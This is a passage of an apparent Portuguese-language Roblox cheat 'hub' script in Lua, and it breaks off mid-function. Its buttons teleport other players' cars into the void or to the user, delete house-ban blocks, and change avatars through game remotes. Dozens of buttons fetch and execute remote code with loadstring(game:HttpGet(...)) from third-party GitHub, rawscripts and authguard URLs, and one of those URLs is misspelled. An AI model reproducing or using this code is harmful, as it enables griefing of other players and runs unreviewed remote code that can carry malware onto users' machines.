      if not humanoidRootPart31 then
        return false
      end

      humanoid32.Sit = false
      task.wait(0.1)
      humanoidRootPart31.CFrame = index59.CFrame + Vector3.new(0, 5, 0)
      task.wait(0.1)
      index59:Sit(humanoid32)
      task.wait(0.5)
      return humanoid32.SeatPart == index59
    end
  end

  function v20:TeleportToVoid(p29)
    local vector9

    if not p29 then
      return
    elseif not p29.PrimaryPart then
      local findFirstChild16 = p29:FindFirstChild("Body", true)
        or p29:FindFirstChild("Chassis", true)

      if findFirstChild16 and findFirstChild16:IsA("BasePart") then
        p29.PrimaryPart = findFirstChild16
        vector9 = Vector3.new(0, -1000, 0)
        p29:SetPrimaryPartCFrame(CFrame.new(vector9))
        task.wait(0.5)
        return
      end
      return
    else
      vector9 = Vector3.new(0, -1000, 0)
      p29:SetPrimaryPartCFrame(CFrame.new(vector9))
      task.wait(0.5)
      return
    end
  end

  function v20:TeleportToPlayer(p30, index60)
    local vector10

    if not p30 then
      return
    elseif not p30.PrimaryPart then
      local findFirstChild17 = p30:FindFirstChild("Body", true)
        or p30:FindFirstChild("Chassis", true)

      if findFirstChild17 and findFirstChild17:IsA("BasePart") then
        p30.PrimaryPart = findFirstChild17
        vector10 = Vector3.new(5, 0, 5)
        p30:SetPrimaryPartCFrame(CFrame.new(index60 + vector10))
        task.wait(0.5)
        return
      end
      return
    else
      vector10 = Vector3.new(5, 0, 5)
      p30:SetPrimaryPartCFrame(CFrame.new(index60 + vector10))
      task.wait(0.5)
      return
    end
  end

  function v20:ExitCarAndReturn(p31)
    if not self.LocalPlayer.Character
      or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then
      return
    else
      local humanoid33 = self.LocalPlayer.Character.Humanoid

      if humanoid33.SeatPart then
        humanoid33.Sit = false
      end

      task.wait(0.1)

      if p31 then
        self.LocalPlayer.Character:PivotTo(CFrame.new(p31))
      end
      return
    end
  end

  function v20:AtualizarListaCarros()
    local v152 = self.Workspace
    local v153 = {}
    local vehicles5 = v152:FindFirstChild("Vehicles")

    if vehicles5 then
      for index61, value92 in ipairs(vehicles5:GetChildren()) do
        if value92.Name:match("Car$") then
          table.insert(v153, value92.Name)
        end
      end
    end

    return v153
  end

  tab9:AddParagraph({ Title = "use o void protection", Content = "" })

  tab9:AddToggle({
    Name = "Matar todos os carros do server",
    Description = "Teleporta os carros para o void",
    Default = false,
    Callback = function(value93)
      local v154 = value93
      local f35, position3

      if value93 then
        if self.LocalPlayer.Character
          and self.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
          position3 = self.LocalPlayer.Character.HumanoidRootPart.Position

          function f35()
            local vehicles6 = v20.Workspace:FindFirstChild("Vehicles")

            if not vehicles6 then
              return
            else
              local v155 = {}

              for index62, value94 in ipairs(vehicles6:GetChildren()) do
                if value94.Name:match("Car$") then
                  table.insert(v155, value94)
                end
              end

              for index63, value95 in ipairs(v155) do
                if not v154 then
                  break
                else
                  local findFirstChildWhichIsA = value95:FindFirstChildWhichIsA(
                    "VehicleSeat", true
                  )

                  if findFirstChildWhichIsA and findFirstChildWhichIsA.Occupant == nil then
                    if v20:TeleportToSeat(findFirstChildWhichIsA, value95) then
                      v20:TeleportToVoid(value95)
                      v20:ExitCarAndReturn(position3)
                      task.wait(1)
                    end
                  end
                end
              end

              if v154 then
                v154 = false
                v20:ToggleFallDamage(false)
              end
              return
            end
          end

          v20:ToggleFallDamage(true)
          task.spawn(f35)
          return
        end
        return
      end

      v154 = false
      v20:ToggleFallDamage(false)
    end,
  })

  tab9:AddSection({ "functions dos carro" })

  addDropdown = tab9:AddDropdown({
    Name = "Selecionar Carro do Jogador",
    Description = "Selecione o carro de um jogador",
    Default = nil,
    Options = v20:AtualizarListaCarros(),
    Callback = function(value96) _G.SelectedVehicle = value96 end,
  })

  tab9:AddToggle({
    Name = "Ver CÃ¢mera do Carro Selecionado",
    Description = "Foca a cÃ¢mera no carro selecionado",
    Default = false,
    Callback = function(value97)
      if value97 then
        if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
          return
        else
          local vehicles7 = v20.Workspace:FindFirstChild("Vehicles")

          if not vehicles7 then
            return
          else
            local findFirstChild18 = vehicles7:FindFirstChild(_G.SelectedVehicle)

            if not findFirstChild18 then
              return
            else
              local findFirstChildWhichIsA2 = findFirstChild18:FindFirstChildWhichIsA(
                "VehicleSeat", true
              )

              if not findFirstChildWhichIsA2 then
                return
              end

              v20.OriginalCameraSubject = v20.Camera.CameraSubject
              v20.OriginalCameraType = v20.Camera.CameraType
              v20.Camera.CameraSubject = findFirstChildWhichIsA2
              v20.Camera.CameraType = Enum.CameraType.Follow
              return
            end
          end
        end
      else
        if v20.OriginalCameraSubject then
          v20.Camera.CameraSubject = v20.OriginalCameraSubject

          local camera = v20.Camera
          camera.CameraType = v20.OriginalCameraType or Enum.CameraType.Custom

          v20.OriginalCameraSubject = nil
          v20.OriginalCameraType = nil
        end
        return
      end
    end,
  })

  local vehiclesFolder = v20.Workspace:WaitForChild("Vehicles", 5)
if vehiclesFolder then
    vehiclesFolder.ChildAdded:Connect(function()
        addDropdown:Set(v20:AtualizarListaCarros())
    end)
    vehiclesFolder.ChildRemoved:Connect(function()
        addDropdown:Set(v20:AtualizarListaCarros())
    end)
end

  tab9:AddSection({ "functions kill e trazer" })

  tab9:AddButton({
    Name = "Destruir Carro Selecionado",
    Description = "Teleporta o carro selecionado para o void",
    Callback = function()
      if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
        return
      else
        local vehicles8 = v20.Workspace:FindFirstChild("Vehicles")

        if not vehicles8 then
          return
        else
          local findFirstChild19 = vehicles8:FindFirstChild(_G.SelectedVehicle)

          if not findFirstChild19 then
            return
          else
            local findFirstChildWhichIsA3 = findFirstChild19:FindFirstChildWhichIsA(
              "VehicleSeat", true
            )

            if not findFirstChildWhichIsA3 then
              return
            elseif findFirstChildWhichIsA3.Occupant then
              return
            else
              if v20.LocalPlayer.Character
                and v20.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local position4 = v20.LocalPlayer.Character.HumanoidRootPart.Position
                v20:ToggleFallDamage(true)

                if v20:TeleportToSeat(findFirstChildWhichIsA3, findFirstChild19) then
                  v20:TeleportToVoid(findFirstChild19)
                  v20:ExitCarAndReturn(position4)
                end

                v20:ToggleFallDamage(false)
                return
              end
            end
          end
        end
      end
    end,
  })

  tab9:AddButton({
    Name = "Trazer Carro Selecionado",
    Description = "Teleporta o carro selecionado para sua posiÃ§Ã£o",
    Callback = function()
      if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
        return
      else
        local vehicles9 = v20.Workspace:FindFirstChild("Vehicles")

        if not vehicles9 then
          return
        else
          local findFirstChild20 = vehicles9:FindFirstChild(_G.SelectedVehicle)

          if not findFirstChild20 then
            return
          else
            local findFirstChildWhichIsA4 = findFirstChild20:FindFirstChildWhichIsA(
              "VehicleSeat", true
            )

            if not findFirstChildWhichIsA4 then
              return
            elseif findFirstChildWhichIsA4.Occupant then
              return
            else
              if v20.LocalPlayer.Character
                and v20.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local position5 = v20.LocalPlayer.Character.HumanoidRootPart.Position
                v20:ToggleFallDamage(true)

                if v20:TeleportToSeat(findFirstChildWhichIsA4, findFirstChild20) then
                  v20:TeleportToPlayer(findFirstChild20, position5)
                  v20:ExitCarAndReturn(position5)
                end

                v20:ToggleFallDamage(false)
                return
              end
            end
          end
        end
      end
    end,
  })

  tab9:AddButton({
    Name = "Trazer Todos os Carros",
    Description = "Teleporta todos os carros do servidor para sua posiÃ§Ã£o",
    Callback = function()
      if v20.LocalPlayer.Character
        and v20.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local position6 = v20.LocalPlayer.Character.HumanoidRootPart.Position
        local vehicles10 = v20.Workspace:FindFirstChild("Vehicles")

        if not vehicles10 then
          return
        else
          v20:ToggleFallDamage(true)
          local v156 = {}

          for index64, value98 in ipairs(vehicles10:GetChildren()) do
            if value98.Name:match("Car$") then
              table.insert(v156, value98)
            end
          end

          for index65, value99 in ipairs(v156) do
            local findFirstChildWhichIsA5 = value99:FindFirstChildWhichIsA("VehicleSeat", true)

            if findFirstChildWhichIsA5 and findFirstChildWhichIsA5.Occupant == nil then
              if v20:TeleportToSeat(findFirstChildWhichIsA5, value99) then
                v20:TeleportToPlayer(value99, position6)
                v20:ExitCarAndReturn(position6)
                task.wait(1)
              end
            end
          end

          v20:ToggleFallDamage(false)
          return
        end
      end
    end,
  })

  v20.LocalPlayer.CharacterAdded:Connect(function(character24)
    local humanoid34 = character24:WaitForChild("Humanoid")
    humanoid34:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
    humanoid34:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
  end)

  tab10:AddParagraph({ Title = "FunÃ§Ãµes para vocÃª usar em vocÃª", Content = "" })

  tab10:AddButton({
    Name = "Remover Ban de Todas as Casas",
    Description = "Tenta remover o ban de todas as casas ",
    Callback = function()
      local count = 0
      local count2 = 0

      for i = 1, 37 do
        local findFirstChild21 = workspaceService:FindFirstChild("BannedBlock" .. i, true)

        if findFirstChild21 then
          if pcall(function() findFirstChild21:Destroy() end) then
            count = count + 1
          else
            count2 = count2 + 1
          end
        end
      end

      for key5, value100 in pairs(workspaceService:GetDescendants()) do
        local v157 = value100

        if v157.Name:match("BannedBlock") then
          if pcall(function() v157:Destroy() end) then
            count = count + 1
          else
            count2 = count2 + 1
          end
        end
      end

      if count > 0 then
        starterGui:SetCore("SendNotification", {
          Title = "Sucesso",
          Text = "Bans removidos de " .. count .. " casas!",
          Duration = 5,
        })
      end
    end,
  })

  -- =========================================================================
  -- ABA PROTECAO (MIGRADA E ATIVADA NO LUGAR DE SPAM)
  -- =========================================================================
  tab11:AddSection({ "ProteÃ§Ã£o e Anti-Fling" })

  tab11:AddButton({
      Name = "Protection Bug",
      Callback = function()
          pcall(function()
              starterGui:SetCore("SendNotification", { Title = "Moon Hub", Text = "Protection Bug ativado!", Duration = 3 })
          end)
      end
  })

  tab11:AddToggle({
      Name = "Anti Fling Carros",
      Default = false,
      Callback = function(Value)
          _G.AntiFlingCarros = Value
          task.spawn(function()
              while _G.AntiFlingCarros do
                  task.wait(0.5)
                  pcall(function()
                      local vehicles = workspaceService:FindFirstChild("Vehicles")
                      if vehicles then
                          for _, v in pairs(vehicles:GetChildren()) do
                              for _, p in pairs(v:GetDescendants()) do
                                  if p:IsA("BasePart") then
                                      p.CanCollide = false
                                  end
                              end
                          end
                      end
                  end)
              end
          end)
      end
  })

  tab11:AddToggle({
      Name = "Anti Canoe Fling",
      Default = false,
      Callback = function(Value)
          _G.AntiCanoe = Value
      end
  })

  tab11:AddToggle({
      Name = "Anti Fling Jets",
      Default = false,
      Callback = function(Value)
          _G.AntiJets = Value
      end
  })

  tab11:AddToggle({
      Name = "Anti Fling Helicopteros",
      Default = false,
      Callback = function(Value)
          _G.AntiHeli = Value
      end
  })

  tab11:AddToggle({
      Name = "Anti Fling Ball",
      Default = false,
      Callback = function(Value)
          _G.AntiBall = Value
      end
  })

  tab11:AddToggle({
      Name = "Anti Sit",
      Default = false,
      Callback = function(Value)
          local char = localPlayer.Character
          if char then
              local hum = char:FindFirstChildOfClass("Humanoid")
              if hum then
                  hum.Sit = not Value
                  hum:SetStateEnabled(Enum.HumanoidStateType.Seated, not Value)
              end
          end
      end
  })

  tab11:AddToggle({
      Name = "Anti-Lag",
      Default = false,
      Callback = function(Value)
          if Value then
              pcall(function()
                  for _, v in pairs(workspaceService:GetDescendants()) do
                      if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
                          v.Material = Enum.Material.SmoothPlastic
                          v.Reflectance = 0
                      end
                  end
              end)
          end
      end
  })

  tab11:AddToggle({
      Name = "Anti Fling Portas",
      Default = false,
      Callback = function(Value)
          _G.AntiPortas = Value
      end
  })

  tab12:AddButton({
    Name = "Naruto",
    Desc = "Naruto FE.",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas"))()
    end,
  })

  tab12:AddButton({
    Name = "Batman",
    Description = "Batman FE.",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas89"))()
    end,
  })

  tab12:AddButton({
    Name = "Sonic.Exe",
    Description = "Sonic.Exe FE.",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas86"))()
    end,
  })

  tab12:AddButton({
    Title = "Panico",
    Desc = "PÃ¢nico FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/yyyyyyyface/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Morty",
    Desc = "Morty FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/repositoryredzlib/Mortyyyyyy/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Rick Sanchez",
    Desc = "Rick Sanchez FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/rick-Sanchez-/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Cowboy",
    Desc = "Cowboy FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/wjsj/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Guest666 FE",
    Desc = "Guest666 FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/swsw/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Camera De Carro",
    Desc = "carro no roblox kkj",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/repositoryredzlib/Carfling/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Fe vr",
    Desc = "FE VR",
    Callback = function()
      task.delay(6, function()
        pcall(function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty45.lua"))()
        end)
      end)
    end,
  })

  tab12:AddButton({
    Title = "Obito",
    Desc = "Obito FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/c47b8a12ca6c4cef840280dafd893e7d"))()
    end,
  })

  tab12:AddButton({
    Name = "Shadow",
    Desc = "Shadow FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/267266273ffsfs/Shadow/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Name = "Goner",
    Desc = "Executa o Goner fe",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/GONER/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Name = "Noly",
    Desc = "Noly FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/gubby/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Name = "Tubers",
    Desc = "Tubers FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/1222/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Title = "mÃ£ozinha",
    Desc = "mÃ£ozinha FE",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/slafiznotedio/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "C00LKIDD",
    Desc = "C00LKIDD FE",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/repositoryredzlib/xzzxsx/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Emote v2",
    Desc = "Emotes FREE",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Free-emote/refs/heads/main/Delta%20mad%20stuffs"))()
    end,
  })

  tab12:AddButton({
    Name = "Herobrine",
    Desc = "Herobrine FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/hEROBRINE/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Name = "John doe",
    Description = "John Doe FE",
    Callback = function()
      pcall(function()
        local changeBodyColor = replicatedStorage.Remotes.ChangeBodyColor
        local changeCharacterBody = replicatedStorage.Remotes.ChangeCharacterBody
        local wear = replicatedStorage.Remotes.Wear
        changeBodyColor:FireServer("Really black")
        changeCharacterBody:InvokeServer({ 0, 0, 0, 0, 0, 0 })

        wear:InvokeServer(119700638189200)
        wear:InvokeServer(82561279414761)
        wear:InvokeServer(108099676910290)
        wear:InvokeServer(82861921093234)
        wear:InvokeServer(124476454384080)
        wear:InvokeServer(5319900634)
        wear:InvokeServer(5319909330)
        wear:InvokeServer(5319922112)
      end)
    end,
  })

  tab12:AddButton({
    Name = "CARTOON CAT",
    Description = "CARTOON CAT FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/cartoon-cat/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Name = "Ominitrix",
    Desc = "Ominitrix FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/267266273ffsfs/Ominitrix/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Title = "Kamui",
    Desc = "Ativa o Kamui (hubzin)",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/267266273ffsfs/kamui/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Jerk",
    Desc = "Jerk FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://rawgithubusercontent.com/yeahblxr/Scripts/refs/heads/main/Edge.lua"))()
    end,
  })

  tab12:AddButton({
    Title = "Emotes fe",
    Desc = "Emotes fe :)",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AFEM-Max-Open-Alpha-50210"))()
    end,
  })

  tab12:AddButton({
    Title = "Jeff The Killer",
    Desc = "Jeff The Killer FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/267266273ffsfs/Jeff/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Minecraft",
    Desc = "Minecraft no roblox kk",
    Locked = false,
    Callback = function()
      task.spawn(function()
        local wearShirt = replicatedStorage.Remotes:FindFirstChild("WearShirt")

        if wearShirt then
          pcall(function() wearShirt:InvokeServer(16512333409) end)
        end

        task.wait(0.2)
        local changeCharacterBody2 = replicatedStorage.Remotes:FindFirstChild("ChangeCharacterBody")

        if changeCharacterBody2 then
          pcall(function() changeCharacterBody2:InvokeServer({ 0, 0, 0, 0, 0, 0 }) end)
        end

        task.wait(0.2)
        local wearPants = replicatedStorage.Remotes:FindFirstChild("WearPants")

        if wearPants then
          pcall(function() wearPants:InvokeServer(16512431524) end)
        end

        task.wait(0.2)
        local wear2 = replicatedStorage.Remotes:FindFirstChild("Wear")

        if wear2 then
          pcall(function() wear2:InvokeServer(137179147781164) end)
        end

        task.wait(0.2)
        local changeBodyColor2 = replicatedStorage.Remotes:FindFirstChild("ChangeBodyColor")

        if changeBodyColor2 then
          changeBodyColor2:FireServer("Dark nougat")
        end
      end)

      local localPlayer11 = players.LocalPlayer

      local v158 = {
        LOGO_PADRAO,
      }

      local function f36(target)
        if not target:IsA("Part") then
          return false
        end

        for index66, value101 in ipairs(target:GetChildren()) do
          if value101:IsA("Decal") then
            for index67, value102 in ipairs(v158) do
              if value101.Texture == value102 then
                return true
              end
            end
          end
        end

        if target.Name == "Bloco com Fisica" then
          return true
        end

        if target.Size == Vector3.new(3, 3, 3) then
          return true
        end

        return false
      end

      local function f37(p32)
        local target2 = p32.Target

        if target2 and target2:IsA("BasePart") and f36(target2) then
          return target2
        end
      end

      local function f38(title, text2)
        starterGui:SetCore("SendNotification", { Title = title, Text = text2, Duration = 3 })
      end

      local swordGoner = Instance.new("Tool")
      swordGoner.Name = "Sword goner"
      swordGoner.RequiresHandle = true
      swordGoner.CanBeDropped = true

      local handle2 = Instance.new("Part")
      handle2.Name = "Handle"
      handle2.Size = Vector3.new(0.1, 0.1, 0.1)
      handle2.Massless = true
      handle2.Anchored = false
      handle2.CanCollide = false
      handle2.Transparency = 0.5
      handle2.Color = Color3.fromRGB(255, 0, 0)

      local instance3 = Instance.new("SpecialMesh", handle2)
      instance3.MeshType = Enum.MeshType.Sphere
      instance3.Scale = Vector3.new(0.05, 0.05, 0.05)

      handle2.Parent = swordGoner

      swordGoner.Equipped:Connect(function(p33)
        local parent = swordGoner.Parent

        if parent and parent:FindFirstChild("Humanoid")
          and parent.Humanoid.RigType == Enum.HumanoidRigType.R15 then
          replicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(12780809235)

          p33.Button1Down:Connect(function()
            local humanoid35 = parent:FindFirstChildOfClass("Humanoid")
            local animator3 = humanoid35 and humanoid35:FindFirstChildOfClass("Animator")

            if animator3 then
              local animation7 = Instance.new("Animation")
              animation7.AnimationId = "rbxassetid://2410679501"
              animator3:LoadAnimation(animation7):Play()
            end

            local v159 = f37(p33)

            if v159 then
              v159:Destroy()
            end
          end)
        end
      end)

      swordGoner.Unequipped:Connect(function()
        replicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(12780809235)
      end)

      swordGoner.Parent = localPlayer11.Backpack

      local function makeTool(textureId, texture, p34)
        local tool = Instance.new("Tool")
        tool.Name = ""
        tool.TextureId = textureId
        tool.CanBeDropped = false
        tool.Parent = localPlayer11.Backpack

        local handle3 = Instance.new("Part")
        handle3.Name = "Handle"
        handle3.Size = Vector3.new(1.5, 1.5, 1.5)
        handle3.Anchored = false
        handle3.CanCollide = false
        handle3.Color = Color3.fromRGB(255, 255, 255)
        handle3.Parent = tool

        for index68, value103 in ipairs(Enum.NormalId:GetEnumItems()) do
          local decal = Instance.new("Decal")
          decal.Texture = texture
          decal.Face = value103
          decal.Parent = handle3
        end

        local getMouse = localPlayer11:GetMouse()

        tool.Activated:Connect(function()
          local p = getMouse.Hit.p

          local blocoComFSica = Instance.new("Part")
          blocoComFSica.Size = Vector3.new(3, 3, 3)
          blocoComFSica.Anchored = not p34
          blocoComFSica.Position = p + Vector3.new(0, 1.5, 0)
          blocoComFSica.Parent = workspaceService

          if p34 then
            blocoComFSica.CanCollide = true
            blocoComFSica.Name = "Bloco com FÃ­sica"
          end

          for index69, value104 in ipairs(Enum.NormalId:GetEnumItems()) do
            local decal2 = Instance.new("Decal")
            decal2.Texture = texture
            decal2.Face = value104
            decal2.Parent = blocoComFSica
          end
        end)
      end

      local function makeTool2(textureId2, texture2, texture3)
        local tool2 = Instance.new("Tool")
        tool2.Name = ""
        tool2.TextureId = textureId2
        tool2.CanBeDropped = false
        tool2.Parent = localPlayer11.Backpack

        local handle4 = Instance.new("Part")
        handle4.Name = "Handle"
        handle4.Size = Vector3.new(1.5, 1.5, 1.5)
        handle4.Anchored = false
        handle4.CanCollide = false
        handle4.Color = Color3.fromRGB(255, 255, 255)
        handle4.Parent = tool2

        for index70, value105 in ipairs(Enum.NormalId:GetEnumItems()) do
          local decal3 = Instance.new("Decal")

          if value105 == Enum.NormalId.Top then
            decal3.Texture = texture3
          else
            decal3.Texture = texture2
          end

          decal3.Face = value105
          decal3.Parent = handle4
        end

        local getMouse2 = localPlayer11:GetMouse()

        tool2.Activated:Connect(function()
          local p35 = getMouse2.Hit.p

          local part = Instance.new("Part")
          part.Size = Vector3.new(3, 3, 3)
          part.Anchored = true
          part.Position = p35 + Vector3.new(0, 1.5, 0)
          part.Parent = workspaceService

          for index71, value106 in ipairs(Enum.NormalId:GetEnumItems()) do
            local decal4 = Instance.new("Decal")

            if value106 == Enum.NormalId.Top then
              decal4.Texture = texture3
            else
              decal4.Texture = texture2
            end

            decal4.Face = value106
            decal4.Parent = part
          end
        end)
      end

      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool2(LOGO_PADRAO, LOGO_PADRAO, LOGO_PADRAO)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, true)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)

      local tool3 = Instance.new("Tool")
      tool3.Name = "id"
      tool3.TextureId = LOGO_PADRAO
      tool3.CanBeDropped = false
      tool3.Parent = localPlayer11.Backpack

      handle5 = Instance.new("Part")
      handle5.Name = "Handle"
      handle5.Size = Vector3.new(1.5, 1.5, 1.5)
      handle5.Anchored = false
      handle5.CanCollide = false
      handle5.Transparency = 1
      handle5.Parent = tool3

      for index72, value107 in ipairs(Enum.NormalId:GetEnumItems()) do
        local decal5 = Instance.new("Decal")
        decal5.Texture = LOGO_PADRAO
        decal5.Face = value107
        decal5.Parent = handle5
      end

      local getMouse3 = localPlayer11:GetMouse()

      tool3.Activated:Connect(function()
    local getMouse4 = localPlayer11:GetMouse()
    local novaParte = Instance.new("Part")
    novaParte.Size = Vector3.new(3, 3, 3)
    novaParte.Anchored = true
    novaParte.Position = getMouse4.Hit.p + Vector3.new(0, 1.5, 0)
    novaParte.Parent = workspaceService

    for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
      local decal6 = Instance.new("Decal")
      decal6.Texture = LOGO_PADRAO
      decal6.Face = face
      decal6.Parent = novaParte
    end
end)
    end,
  })

  tab13:AddButton({
    Name = "FE Jerk Off Hub Matrix",
    Description = "Universal",
    Callback = function()
      loadstring(game:HttpGet("https://rawgithubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
    end,
  })

  tab13:AddButton({
    Name = "FE HUGG",
    Description = "Universal",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/JSFKGBASDJKHIOAFHDGHIUODSGBJKLFGDKSB/fe/refs/heads/main/FEHUGG"))()
    end,
  })

  tab13:AddButton({
    Name = "Buraco Negro",
    Description = "Universal",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BringFlingPlayers"))()
    end,
  })

  tab13:AddButton({
    Name = "System Broochk",
    Description = "Universal",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
    end,
  })

  tab13:AddButton({
    Name = "Roships",
    Description = "Universal",
    Callback = function()
      loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-rochips-universal-18254"))()
    end,
  })

  tab13:AddButton({
    Name = "Sander X",
    Description = "Somente para Brookhaven",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/SanderXV4.2.2/refs/heads/main/New.lua"))()
    end,
  })

  tab13:AddButton({
    Name = "Reverso",
    Description = "Reverso",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/L"))()
    end,
  })

  tab13:AddButton({
    Name = "RD4",
    Description = "Somente para Brookhaven",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script"))()
    end,
  })

-- ═══════════════════════════════════════════════════════════════════════
-- RECURSOS EXTRAS — TODAS AS ABAS
-- ═══════════════════════════════════════════════════════════════════════
do
  local P    = game:GetService("Players")
  local RS   = game:GetService("ReplicatedStorage")
  local WS   = game:GetService("Workspace")
  local R    = game:GetService("RunService")
  local T    = game:GetService("TweenService")
  local VIM  = game:GetService("VirtualInputManager")
  local LP   = P.LocalPlayer
  local char = LP.Character or LP.CharacterAdded:Wait()

  local function notify(t, txt)
    pcall(function() starterGui:SetCore("SendNotification", { Title = t, Text = txt, Duration = 4 }) end)
  end
  local function plist()
    local t = {}
    for _, p in ipairs(P:GetPlayers()) do if p ~= LP then table.insert(t, p.Name) end end
    return t
  end

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ TAB 3 (troll) — Extras
-- ═══════════════════════════════════════════════════════════════════════

tab3:AddSection({ "Vortex de Parts" })

local vx = { ativo = false, conn = nil, conn2 = nil, folder = nil, part = nil, att = nil }
local function toggleVortex()
  vx.ativo = not vx.ativo
  if vx.ativo then
    vx.folder = WS:FindFirstChild("AuxFolder") or Instance.new("Folder", WS)
    vx.folder.Name = "AuxFolder"
    vx.part = vx.folder:FindFirstChild("AnchorP") or Instance.new("Part", vx.folder)
    vx.part.Name, vx.part.Anchored, vx.part.CanCollide, vx.part.Transparency = "AnchorP", true, false, 1
    vx.part.Size, vx.part.Position = Vector3.new(5,5,5), Vector3.new(-26.54, 4.13, 3.94)
    vx.att = vx.part:FindFirstChild("Att1") or Instance.new("Attachment", vx.part)
    vx.att.Name = "Att1"
    local function pull(v)
      if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid")
